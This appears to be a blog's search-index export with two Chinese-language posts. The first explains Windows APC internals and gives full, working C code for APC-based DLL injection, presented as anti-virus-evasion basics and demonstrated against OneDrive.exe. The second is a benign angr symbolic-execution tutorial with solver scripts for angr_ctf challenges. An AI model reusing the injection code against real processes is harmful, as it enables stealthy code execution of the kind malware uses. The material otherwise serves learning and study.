<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APC注入</title>
    <url>/2023/09/12/APC%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>APC即异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。由于线程是不能被杀掉，挂起，恢复的，线程在执行时会占据CPU，而APC注入可以改变一个线程的行为，可用于DLL注入。</p>
<span id="more"></span>

<h1 id="一、APC机制"><a href="#一、APC机制" class="headerlink" title="一、APC机制"></a>一、APC机制</h1><h2 id="1-1APC调用的条件"><a href="#1-1APC调用的条件" class="headerlink" title="1.1APC调用的条件"></a>1.1APC调用的条件</h2><p>​		往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。这里介绍一下应用程序的APC，APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条</p>
<p>件的。</p>
<p>​		当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait，MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx函数时进入可警告状态。如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数。但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。</p>
<h2 id="1-2QueueUserAPC函数"><a href="#1-2QueueUserAPC函数" class="headerlink" title="1.2QueueUserAPC函数"></a>1.2QueueUserAPC函数</h2><p>QueueUserAPC用于添加制定的异步函数调用(回调函数)到执行的线程的APC队列中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD QueueUserAPC( PAPCFUNCpfnAPC, // APC function,执行函数地址</span><br><span class="line">					HANDLEhThread, // handle to thread，插入APC的线程句柄，句柄必须包含THREAD_SET_CONTEXT 访问权限。</span><br><span class="line">                    ULONG_PTRdwData // APC function parameter，第三个参数表示传递给执行函数的参数</span><br><span class="line">                    );</span><br></pre></td></tr></table></figure>

<h2 id="1-3APC队列"><a href="#1-3APC队列" class="headerlink" title="1.3APC队列"></a>1.3APC队列</h2><p>APC是针对具体线程，由具体线程加以执行的，所以每个线程都有自己的APC队列。内核中代表着线程的数据结构是ETHREAD，而ETHREAD中的第一个成分Tcb 是KTHREAD数据结构，线程的APC队列就在KTHREAD里面。</p>
<p>KTHREAD + 0x34 处是一个 _KAPC_STATE 结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">...</span><br><span class="line">+0x034 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>

<p>_KAPC_STATE的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KAPC_STATE </span><br><span class="line">nt!_KAPC_STATE </span><br><span class="line">+0x000 ApcListHead //2个APC队列 用户APC和内核APC</span><br><span class="line">+0x010 Process //线程所属或者所挂靠的进程</span><br><span class="line">+0x014 KernelApcInProgress //内核APC是否正在执行</span><br><span class="line">+0x015 KernelApcPending //是否有正在等待执行的内核APC</span><br><span class="line">+0x016 UserApcPending //是否有正在等待执行的用户APC</span><br><span class="line"></span><br><span class="line">用户APC：APC函数地址位于用户空间，在用户空间执行</span><br><span class="line"></span><br><span class="line">内核APC：APC函数地址位于内核空间，在内核空间执行（分为NormalRoutine为NULL的SpecialKernelApc和不为NULL的NormalKernelApc。SpecialKernelApc只执行KernelRoutine，IRQL为APC_LEVEL，而NormalKernelApc不仅仅执行 KernelRoutine还执行NormalRoutine，在PASSIVE_LEVEL下执行NormalRoutine。）</span><br></pre></td></tr></table></figure>

<p>NormalRoutine 会找到你提供的APC函数，并不完全等于APC函数的地址。</p>
<h2 id="1-4APC函数执行流程"><a href="#1-4APC函数执行流程" class="headerlink" title="1.4APC函数执行流程"></a>1.4APC函数执行流程</h2><h3 id="1-4-1相关函数"><a href="#1-4-1相关函数" class="headerlink" title="1.4.1相关函数"></a>1.4.1相关函数</h3><p>KiServiceExit函数：这个函数是系统调用、异常或中断返回用户空间的必经之路。</p>
<p>KiDeliverApc函数：负责执行APC函数</p>
<h3 id="1-4-2QueueUserApc"><a href="#1-4-2QueueUserApc" class="headerlink" title="1.4.2QueueUserApc"></a>1.4.2QueueUserApc</h3><p>(1)通过3环的QueueUserApc函数可以完成将APC插入到队列的操作，首先调用了 ntdll.dll 的 NtQueueApcThread。</p>
<p>(2)然后通过 0xB4 的调用号进入ring0。在windbg里面对应的内核函数为 NtQueueApcThread。</p>
<p>(3)然后在 ntosknl.exe 里面定位到 NtQueueApcThread.</p>
<p>(4)最后是调用 KeInitializeApc(对KAPC结构体进行初始化) 和 KeInsertQueueApc 这两个函数来实现APC的效果。</p>
<h3 id="1-4-3用户APC"><a href="#1-4-3用户APC" class="headerlink" title="1.4.3用户APC"></a>1.4.3用户APC</h3><p>当产生系统调用、中断或者异常，线程在返回用户空间前都会调用 KiServiceExit 函数，在KiServiceExit 会判断是否有要执行的用户APC，如果有则调用KiDeliverApc 函数(第一个参数为1)进行处理。涉及的换栈操作如下：</p>
<p>（1）当线程从用户层进入内核层时，要保留原来的运行环境，比如各种寄存器，栈的位置等等( _Trap_Frame )，然后切换成内核的堆栈，如果正常返回，恢复堆栈环境即可。用来保存原始环境的数据结构为SavedApcState。</p>
<p>（2）但如果有用户APC要执行的话，就意味着线程要提前返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到其他的位置，每处理一个用户APC都会涉及到：内核–&gt;用户空间–&gt;再回到内核空间。</p>
<p>线程进0环时，原来的运行环境(寄存器栈顶等)保存到 _Trap_Frame 结构体中，如果要提前返回3环去处理用户APC，就必须要修改 _Trap_Frame 结构体。处理完APC后该如何返回原来的位置？</p>
<p>KiInitializeUserApc 要做的第一件事就是备份，将原来 _Trap_Frame 的值备份到一个新的结构体中( CONTEXT )，这个功能由其子函数KeContextFromKframes 来完成。具体操作如下:</p>
<p>1.首先判断参数是否为1，当参数为1的时候处理用户APC。再判断Apcstate.UserApcPending是否为1，为1则有用户APC要执行。</p>
<p>2.将ApcState.UserApcPending设置为0.</p>
<p>3.链表操作，将当前APC从用户队列中移除。</p>
<p>4.调用函数(KAPC.KernelRoutine)释放KAPC结构内存空间</p>
<p>5.转到 KiInitializeUserApc 函数，将 CONTEXT 和 TrapFrame 传入 KeContextFromKframes</p>
<p>6.当windows把 CONTEXT 结构复制到堆栈之后，准备用户层执行环境，首先修改SS、DS、ES、FS、GS和EFLAGS寄存器</p>
<p>7.然后修改esp到3环堆栈</p>
<p>8.然后修改eip，这里永远返回一个固定的位置，但是这个位置在每次系统启动的时候都不相同，存放在3环的 ntdll 里的 KiUserApcDispatcher 参数里面</p>
<p>9.然后到ntdll里面定位到 KiUserApcDispatcher ，首先得到指向 CONTEXT 结构的指针，然后 pop eax 得 到 NormalRoutine 结构，这里当APC是内核APC的时候存储的是真正的APC地址，当APC是用户APC的时候存储的是指向用户APC的总入口。当我们调用 QueueUserAPC ，并没有指定 NormalRoutine 结构，只指定了 NormalContext 和 SystemArgument1 ，那么这个参数在 QueueUserAPC 内部指定，在 kernel32.dll 的 BaseDispatchAPC ，用来调用真正的用户APC函数。</p>
<p>10.调用ZwContinue 。</p>
<p>（1）返回内核，如果还有用户APC，重复上面的执行过程。 </p>
<p>（2）如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。 ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p>
<p>11.使用 0x20 的调用号利用调用门回到0环。</p>
<h1 id="二、apc注入"><a href="#二、apc注入" class="headerlink" title="二、apc注入"></a>二、apc注入</h1><h2 id="2-1步骤"><a href="#2-1步骤" class="headerlink" title="2.1步骤"></a>2.1步骤</h2><p>1.当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。</p>
<p>2.当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
<p>3.利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
<p>在整个执行过程中，线程并无任何异常举动，不容易被察觉，但缺点是对于单线程程序一般不存在挂起状态，所以APC注入对于这类程序没有明显效果。</p>
<h2 id="2-2流程"><a href="#2-2流程" class="headerlink" title="2.2流程"></a>2.2流程</h2><p>1.OpenProcess 打开进程</p>
<p>2.VirtualAlloc 申请空间</p>
<p>3.WriteProcessMemory 写入dll信息</p>
<p>4.根据进程对应的线程id打开线程</p>
<p>5.使用 QueueUserApc 插入执行</p>
<h2 id="2-3代码实现"><a href="#2-3代码实现" class="headerlink" title="2.3代码实现"></a>2.3代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;TlHelp32.h&gt;</span><br><span class="line">#include&lt;tchar.h&gt;</span><br><span class="line"></span><br><span class="line">//提权函数</span><br><span class="line">BOOL EnableDebugPrivilege() &#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = 1;</span><br><span class="line">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span><br><span class="line">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span><br><span class="line">		fok = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	return fok;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APCInjectDLL(DWORD dwPid, char* pszDllName) &#123;</span><br><span class="line">	EnableDebugPrivilege(); </span><br><span class="line">	//打开进程,获取进程句柄</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	if (hProcess == NULL) &#123; return FALSE; &#125;</span><br><span class="line">	//向目标进程申请空间写入dll全路径 </span><br><span class="line">	int nSize = strlen(pszDllName);</span><br><span class="line">	LPVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nSize, MEM_COMMIT, PAGE_READWRITE); </span><br><span class="line">	SIZE_T dwWrittenSize = 0; </span><br><span class="line">	WriteProcessMemory(hProcess, pDllAddr, pszDllName, nSize, &amp;dwWrittenSize); </span><br><span class="line">	//获取LoadLibraryA的地址</span><br><span class="line">	HMODULE hMod = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	FARPROC pFuncAddr = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); </span><br><span class="line">	//创建线程快照</span><br><span class="line">	THREADENTRY32 te = &#123; 0 &#125;; </span><br><span class="line">	te.dwSize = sizeof(te);</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);</span><br><span class="line">	if (hSnap == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125;</span><br><span class="line">	DWORD dwRet = 0;</span><br><span class="line">	HANDLE hThread = NULL; </span><br><span class="line">	if (Thread32First(hSnap, &amp;te)) &#123; </span><br><span class="line">		do &#123;</span><br><span class="line">			if (te.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">				hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">				if (hThread) &#123;</span><br><span class="line">					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)pDllAddr);</span><br><span class="line">					hThread = NULL;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; while (Thread32Next(hSnap, &amp;te));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess); </span><br><span class="line">	CloseHandle(hSnap); </span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;int main(int argc, char* argv[]) &#123; </span><br><span class="line">	if (argc == 3) &#123; </span><br><span class="line">		if (FALSE == APCInjectDLL((DWORD)_tstol(argv[1]), argv[2])) </span><br><span class="line">			printf(&quot;APCInject failed\n&quot;); else</span><br><span class="line">			printf(&quot;APCInject successfully\n&quot;); </span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		printf(&quot;\nUsage: %s &lt;PID&gt; &lt;Dllpath&gt;\n&quot;);</span><br><span class="line">		printf(&quot;Example: %s 520 C:\\test.dll\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将程序和要注入的dll放入虚拟机。在cmd中使用tasklist命令查看进程id。</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111408508.png" alt="image-20230912111408508"></p>
<p>找到一个OneDrive.exe,PID为5776</p>
<p>输入命令注入，结果如图：</p>
<p><img src="/images/APC%E6%B3%A8%E5%85%A5/image-20230912111646582.png" alt="image-20230912111646582"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本篇简单介绍了apc注入的基本概念和流程，如果有哪里讲述不对的地还望各位大佬赐教。</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>初步探究angr与ctf</title>
    <url>/2023/11/04/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/</url>
    <content><![CDATA[<p>​	angr是一个基于符号执行与模拟执行的二进制框架。它专注于静态和符号分析，使其适用于各种任务。他寄生于2层环境中，第一层为angr环境，是一个利用virtualenvwrapper软件模拟出来的python环境，用于解决环境的不兼容问题， 第二层是真实的python环境。本篇就是对最近它的学习做个总结。</p>
<span id="more"></span>

<h1 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h1><p>符号执行就是在运行程序时用符号来替代真实值。符号执行相较于真实值执行的优点在于，当时用符号执行程序时，可以遍历的程序路径只有一条，而使用符号进行执行时，由于符号是可变的，我们就可以利用这一特性，尽可能多的将程序每一条路径遍历，这样必定存在至少一条能够输出正确结果的分支，每一条分支的结果都可以表示为一个离散关系式，使用约束求解引擎即可分析出正确结果。但这也反映出使用angr存在<strong>路径爆炸</strong>的问题。</p>
<h1 id="使用angr的步骤"><a href="#使用angr的步骤" class="headerlink" title="使用angr的步骤"></a>使用angr的步骤</h1><p>使用angr不关心文件算法的加密逻辑，只需知道它的开头(想要程序在哪进行)跟结尾(要程序走到哪条路径)即可。</p>
<p>(1)创建project</p>
<p>(2)设置state</p>
<p>(3)新建符号量:BVS(bitvector symbolic)或BVV(bitvector value)</p>
<p>(4)把符号量设置到内存或者其他地方。</p>
<p>(5)设置Simulation Managers，进行路径探索的对象。</p>
<p>(6)运行，探索满足路径需要的值</p>
<p>(7)约束求解，获取执行结果。</p>
<h1 id="基本对象"><a href="#基本对象" class="headerlink" title="基本对象"></a>基本对象</h1><h2 id="Project对象"><a href="#Project对象" class="headerlink" title="Project对象"></a>Project对象</h2><p>载入二进制文件使用angr.Project函数，它的第一个参数是待载入文件的路径。</p>
<p>auto_load_libs设置为false使脚本不在动态连接程序使用的库中进行查找。同时 angr 使用 python 实现了很多的库函数（保存在 angr.SIM_PROCEDURES 里面），默认情况下会使用列表内部的函数来替换实际的函数调用，如果不在列表内才会进入到真正的 library。load-options指明加载的方式，如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>传入参数</th>
</tr>
</thead>
<tbody><tr>
<td>auto_load_libs</td>
<td>是否自动加载程序的依赖</td>
<td>布尔</td>
</tr>
<tr>
<td>skip_libs</td>
<td>希望避免加载的库</td>
<td>库名</td>
</tr>
<tr>
<td>except_missing_libs</td>
<td>无法解析库时是否抛出异常</td>
<td>布尔</td>
</tr>
<tr>
<td>force_load_libs</td>
<td>强制加载的库</td>
<td>库名</td>
</tr>
<tr>
<td>id_path</td>
<td>共享库的优先搜索路径</td>
<td>路径名</td>
</tr>
</tbody></table>
<h2 id="SimState对象"><a href="#SimState对象" class="headerlink" title="SimState对象"></a>SimState对象</h2><p>这个对象保存着程序运行到某一阶段的状态信息。通过这个对象可以操作某一运行状态的上下文信息，比如内存，寄存器等。预设状态有四种方式如下：</p>
<table>
<thead>
<tr>
<th>预设状态方式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>entry_state</td>
<td>初始化状态为程序运行到程序入口处的状态</td>
</tr>
<tr>
<td>blank_state(addr&#x3D;)</td>
<td>大多数数据没有初始化，状态下一条指令为addr处的命令</td>
</tr>
<tr>
<td>full_init_state</td>
<td>共享库和预定义内容已经加载完毕</td>
</tr>
<tr>
<td>call_state</td>
<td>准备调用函数</td>
</tr>
</tbody></table>
<h2 id="SimulationManager对象"><a href="#SimulationManager对象" class="headerlink" title="SimulationManager对象"></a>SimulationManager对象</h2><p>这个对象用于具体的路径探索。下面的一个代码创建一个SimulationManager，他需要传入一个state或者state的列表作为参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">si  = p.factory.simgr(state)</span><br></pre></td></tr></table></figure>

<p>SimulationManager中有许多列表，这些列表被称为stash，它保存处于某种状态的state，stash有如下几种：</p>
<table>
<thead>
<tr>
<th>stash</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>active</td>
<td>保存接下来可以执行并且将要执行的状态</td>
</tr>
<tr>
<td>deadended</td>
<td>由于某些原因不能继续执行的状态</td>
</tr>
<tr>
<td>pruned</td>
<td>与solve的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在pruned里</td>
</tr>
<tr>
<td>unconstrained</td>
<td>如果创建SimulationManager时启用了save_unconstrained,则被认定为不受约束的state会放在这，不受约束的state是指用户数据或者符号控制的指针。</td>
</tr>
<tr>
<td>unsat</td>
<td>认为不可满足的state会放在这里。</td>
</tr>
</tbody></table>
<p>默认情况下，state会被存放在active中。stash中的state可以通过move()方法来转移，将<strong>fulter_func</strong>筛选出来的state从from_stash转移到to_stash。在stash名字前加上one_，可以得到stash中的第一个状态，加上mp_，可以得到一个mulpyplexed版本的stash。可以通过step()方法来让处于active的state执行一个基本块，这种操作不会改变state本身。</p>
<p>可以使用explorer方法去执行某个状态，直到找到目标指令或者active中没有状态为止，它有如下参数：</p>
<ul>
<li>find：传入目标指令的地址或地址列表，或者一个用于判断的函数，函数以state为形参，返回布尔值</li>
<li>avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径</li>
</ul>
<p>此外还有一些搜索策略，之后会集中讲解，默认使用DFS（深度优先搜索）。</p>
<p>explorer找到的符合find的状态会被保存在simgr.found这个列表当中，可以遍历其中元素获取状态。</p>
<h1 id="angr-ctf项目"><a href="#angr-ctf项目" class="headerlink" title="angr_ctf项目"></a>angr_ctf项目</h1><p>GitHub上的一个项目，dist放置的是二进制文件，与dist同目录的各个小项目放置的是c源码，和作者的解析代码以及答案。</p>
<h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>进入ida反编译窗口如下：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231104153043662.png" alt="image-20231104153043662"></p>
<p>该程序是从标准输入中接收一个字符串，然后通过complex_function进行加密。最终加密成的字符串为“JACEJGCS”。因此我们可以编写如下脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">p=angr.Project(&#x27;/home/ubuntu/桌面/00_angr_find&#x27;,auto_load_libs=False)</span><br><span class="line">st=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simgr(st)</span><br><span class="line">sm.explore(find=0x8048675)//&quot;Good Job.&quot;所在模块地址</span><br><span class="line">if sm.found:</span><br><span class="line">    sm=sm.found[0]</span><br><span class="line">    print(sm.posix.dumps(0))</span><br></pre></td></tr></table></figure>

<p>posix.dumps()的作用如下：</p>
<ul>
<li>state.posix.dumps(0):表示到达当前状态所对应的程序输入</li>
<li>state.posix.dumps(1):表示到达当前状态所对应的程序输出</li>
</ul>
<h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>打开该程序发现反编译出来异常庞大。但是仔细观察后发现是因为多次调用<code>avoid_me()</code>,所以要避免这个函数。代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">p=angr.Project(&#x27;/home/ubuntu/桌面/01_angr_avoid&#x27;,auto_load_libs=False)</span><br><span class="line">st=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simgr(st)</span><br><span class="line">sm.explore(find=0x080485e5,avoid=0x080485A8)</span><br><span class="line">if sm.found:</span><br><span class="line">    sm=sm.found[0]</span><br><span class="line">    print(sm.posix.dumps(0))</span><br></pre></td></tr></table></figure>

<h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><p>这个就是<code>&quot;Good Job.&quot;</code>跟<code>&quot;Try again.&quot;</code>的次数比较多，所以要筛选出所有的<code>&quot;Try again.&quot;</code>跟<code>&quot;Good Job.&quot;</code>。具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">p=angr.Project(&#x27;/home/ubuntu/桌面/tmp/02_angr_find_condition&#x27;,auto_load_libs=False)</span><br><span class="line">st=p.factory.entry_state()</span><br><span class="line">sm=p.factory.simgr(st)</span><br><span class="line">def good(state):</span><br><span class="line">    tag=b&#x27;Good&#x27; in state.posix.dumps(1)</span><br><span class="line">    return True if tag else False</span><br><span class="line">def bad(state):</span><br><span class="line">    tag=b&#x27;Try&#x27; in state.posix.dumps(1)</span><br><span class="line">    return True if tag else False</span><br><span class="line">sm.explore(find=good,avoid=bad)</span><br><span class="line">if sm.found:</span><br><span class="line">    sm=sm.found[0]</span><br><span class="line">    print(sm.posix.dumps(0))</span><br></pre></td></tr></table></figure>

<h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p><strong>符号化寄存器。</strong></p>
<p>这里将开始地址设置为<code>call get_user_input</code>之后，用ida看出这里将输入的三个变量被依次放入eax, ebx, edx。所以直接将符号向量注入寄存器。</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106170222675.png" alt="image-20231106170222675"><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106170236116.png" alt="image-20231106170236116"></p>
<p>solution_state.solver.eval(passwd0)返回的是passwd0的一个十进制解，用format将其16进制化。这里：</p>
<p>solver.eval(expression)：将会解出expression一个可行解。<br>solver.eval_one(expression)：将会给出expression的可行解，若有多个可行解，则抛出异常。<br>solver.eval_upto(expression, n)：将会给出最多n个可行解，如果不足n个就给出所有的可行解。<br>solver.eval_exact(expression, n)：将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。<br>solver.min(expression)：将会给出最小可行解。<br>solver.max(expression)：将会给出最大可行解。</p>
<p>代码实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/03_angr_symbolic_registers&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x08048980</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    passwd_size_in_bits=32</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd1=claripy.BVS(&#x27;passwd1&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd2=claripy.BVS(&#x27;passwd2&#x27;,passwd_size_in_bits)</span><br><span class="line">    initial_state.regs.eax=passwd0</span><br><span class="line">    initial_state.regs.ebx=passwd1</span><br><span class="line">    initial_state.regs.edx=passwd2</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            solution0=format(solution_state.solver.eval(passwd0),&#x27;x&#x27;)</span><br><span class="line">            solution1=format(solution_state.solver.eval(passwd1),&#x27;x&#x27;)</span><br><span class="line">            solution2=format(solution_state.solver.eval(passwd2),&#x27;x&#x27;)</span><br><span class="line">            solution=solution0+&quot; &quot;+solution1+&quot; &quot;+solution2</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>符号化栈区</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106162539483.png" alt="image-20231106162539483"></p>
<p>这里v1和v2是栈上的参数。所以可以用angr初始化栈区。不用寄存器初始化的原因是因为这里直接将参数进行了处理。</p>
<p>解密脚本为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/04_angr_symbolic_stack&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x08048697#标准输入之后</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    passwd_size_in_bits=32</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd1=claripy.BVS(&#x27;passwd1&#x27;,passwd_size_in_bits)</span><br><span class="line">    initial_state.regs.ebp=initial_state.regs.esp//平衡堆栈</span><br><span class="line">    padding_length_in_bytes=0x8</span><br><span class="line">    initial_state.regs.esp-=padding_length_in_bytes</span><br><span class="line">    initial_state.stack_push(passwd0)</span><br><span class="line">    initial_state.stack_push(passwd1)</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            solution0=solution_state.solver.eval(passwd0)</span><br><span class="line">            solution1=solution_state.solver.eval(passwd1)</span><br><span class="line">            solution=solution0+&quot; &quot;+solution1</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<p>这里注入的是栈空间位置，所以开始状态设置为输入数据之后，即<code>0x8048697</code>处。</p>
<p>堆栈的符号化是<code>push</code>而不是直接数组下标访问赋值的，所以需要先平衡（<code>initial_state.regs.ebp = initial_state.regs.esp</code>）。linux下栈是从高到低增长的，esp &lt; ebp。</p>
<p>v1和v2共8个字节需要padding，所以有<code>padding_length_in_bytes = 0x8</code>和<code>initial_state.regs.esp -= padding_length_in_bytes</code>。</p>
<h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><p>符号化.bss段</p>
<p>ida反编译打开如下：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106162335844.png" alt="image-20231106162335844"></p>
<p>代码大致意思是输入分4段输入一个长度32的字符串，循环移位后对比。输入字符串位于.bss段(通常放置未输出化的全局变量)。</p>
